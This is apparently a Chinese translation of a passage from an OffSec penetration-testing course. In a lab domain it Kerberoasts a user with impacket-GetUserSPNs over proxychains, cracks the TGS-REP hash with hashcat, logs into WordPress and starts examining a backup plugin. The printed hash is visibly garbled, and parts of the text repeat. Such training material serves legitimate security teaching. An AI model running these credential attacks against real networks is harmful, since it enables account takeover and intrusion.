

# OffSec

使用 Kali Linux 进行渗透测试

可以使用 WPScan 或密码攻击来成功登录 WordPress 仪表板。

每当我们获得新信息时，都应该评估我们已经掌握的知识。对于我们目前的情况，这意味着我们已经获取了 daniela 拥有到 INTERNALSRV1 的 SPN。我们此时的假设是，daniela 可能成功登录 WordPress 登录页面。

由于 daniela 是 Kerberos 账户，我们可以尝试通过这种方法获取用户的密码。如果我们能破解 TGS-REP 密码哈希，我们可能就可以登录 WordPress 并获得对 INTERNALSRV1 的进一步访问。

如果此攻击失败，我们可以使用 WPScan 和其他网络枚举工具识别 INTERNALSRV1 上的潜在漏洞，或者切换到 MAIRS1。

让我们在 Kali 上通过 impacket-GetUserSPNs 跨越 SOCKS5 代理进行 Kerberoasting。为了获取 daniela 的 TGS-REP 哈希，我们必须提供域用户的凭据。因为我们只有一组：

```bash
kali@kali:~$ proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.6.240
beyond.com/john
impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
```

Password：

| ServicePrincipalName | Name | MemberOf | Lastlogon | Delegation |
| :--- | :--- | :--- | :--- | :--- |
| http://internalsrv1.com | daniela | 2022-09-29 04:17:00.26328 | 2022-10-05 03:59:48.37628 | |

# 缓存文件未。
`$krbtgs23=$daniela@BEYOND.com/daniela$4c6c4c80b8aaef0f9e4fe06130d23770$49023c3d9f2a1a5e2b593a17f9a4b3c5c1db855146c1db85568d364c2c3a2f553d3b5f59a246b6b1b28143a357ae8b0f442e0f8c3d2b20s5a31db20b3d4b6e9d184674fa002db37df76c4a65435e277aba6...2430c5f8d3a5b5b6c5f6b6d5f6b1c11f9f1122222222222c44444499333226666666666622222222223333333332222222255555555555555555553333444444444444444400000000000011111422233333333300000000000002a7`

### 列出 daniela 用户账户的 Kerberoasting

让我们将哈希存储在 /home/kali/daniela.hash 并用它启动 Hashcat：

```bash
kali@kali:~$ sudo hashcat -m 1300 daniela.hash
/usr/share/wordlists/rocky.txt
$krbtgs23$daniela@BEYOND.com/daniela$4c6c4c80b8aaef0f9e4fe06130d23770$49023c3d9f2a1a5e2b593a17f9a4b3c5c1db855146c1db85568d364c2c3a2f553d3b5f59a246b6b1b28143a357ae8b0f442e0f8c3d2b20s5a31db20b3d4b6e9d184674fa002db37df76c4a65435e277aba6...2430c5f8d3a5b5b6c5f6b6d5f6b1c11f9f1122222222222c44444499333226666666666622222222223333333332222222255555555555555555553333444444444444444400000000000011111422233333333300000000000002a7`

### 列出 daniela 用户账户的 Kerberoasting

> [维基百科](https://en.wikipedia.org/wiki/Kerberos_(protocol))

95 - 破解 TGS-REP 哈希

非常漂亮！我们成功破解了 TGS-REP 哈希并获得了 daniela 的明文密码。

我们已经确定域用户对任何计算机都没有本地管理员权限，且无法使用 RDP 登录。但是，我们可以使用 WinRM 访问其他系统。

接下来，让我们尝试通过转发端口登录 WordPress

304 以 daniela 登录 WordPress

太棒了！我们成功登录了 WordPress 实例。在下一个章节中，我们将利用此权限访问另一个系统。

24.5 利用 WordPress 插件进行攻击攻击

在上一个章节中，我们获取了 daniela 的明文密码并访问了 INTERNALSRV1 上的 WordPress 仪表板。让我们查看设置和插件。

我们将从配置的用户开始：

305 daniela 是唯一的用户。接下来，让我们检查设置 > 通用

306 通用设置

WordPress 地址 (URL) 和站点地址 (URL) 正如我们所假设的 DNS 名称。其他设置都是默认值。让我们现在检查它们。

307 已安装的 WordPress 插件

307 显示三个插件，其中备份迁移（Backup Migration）已启用。让我们点击管理，进入插件配置页面。通过菜单和设置，我们发现了备份目录路径。

308 备份迁移设置

